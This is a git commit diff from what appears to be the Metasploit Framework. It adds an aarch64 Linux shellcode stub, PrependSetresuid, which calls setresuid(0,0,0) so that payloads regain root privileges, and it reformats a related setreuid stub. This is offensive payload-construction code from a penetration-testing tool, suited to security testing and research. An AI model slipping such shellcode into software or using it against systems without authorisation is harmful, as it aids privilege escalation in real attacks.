ead6af8cbc720936506ecd6a5393293054dc75d8
dledda-r7 <diego_ledda@rapid7.com>
2024-12-20 10:16:46 -0500

    feat: add PrependSetresuid for linux/aarch64

--- lib/msf/core/payload/linux/aarch64/prepends.rb
+++ lib/msf/core/payload/linux/aarch64/prepends.rb
@@ -3,7 +3,7 @@ module Msf
     include Msf::Payload::Linux::Prepends
 
     def prepends_order 
-      %w[PrependSetuid]
+      %w[ PrependSetresuid PrependSetreuid PrependSetuid]
     end
 
     def appends_order 
@@ -20,10 +20,17 @@ module Msf
                             "\x01\x00\x00\xd4",   # svc   0x0
 
         # setreuid(0, 0)
-        'PrependSetreuid' =>  "\xe0\x03\x1f\xaa" +  # mov        x0, xzr
-                              "\xe1\x03\x1f\xaa" +  # mov        x1, xzr
-                              "\x28\x12\x80\xd2" +  # mov        x8, #0x91
-                              "\x01\x00\x00\xd4"    # svc        0x0
+        'PrependSetreuid' =>  "\xe0\x03\x1f\xaa" +  # mov   x0, xzr
+                              "\xe1\x03\x1f\xaa" +  # mov   x1, xzr
+                              "\x28\x12\x80\xd2" +  # mov   x8, #0x91
+                              "\x01\x00\x00\xd4",   # svc   0x0
+
+        # setresuid(0, 0, 0)
+        'PrependSetresuid' => "\xe0\x03\x1f\xaa" +  # mov   x0, xzr
+                              "\xe1\x03\x1f\xaa" +  # mov   x1, xzr
+                              "\xe2\x03\x1f\xaa" +  # mov   x2, xzr
+                              "\x68\x12\x80\xd2" +  # mov   x8, #0x93
+                              "\x01\x00\x00\xd4"    # svc   0x0
       }
     end
 
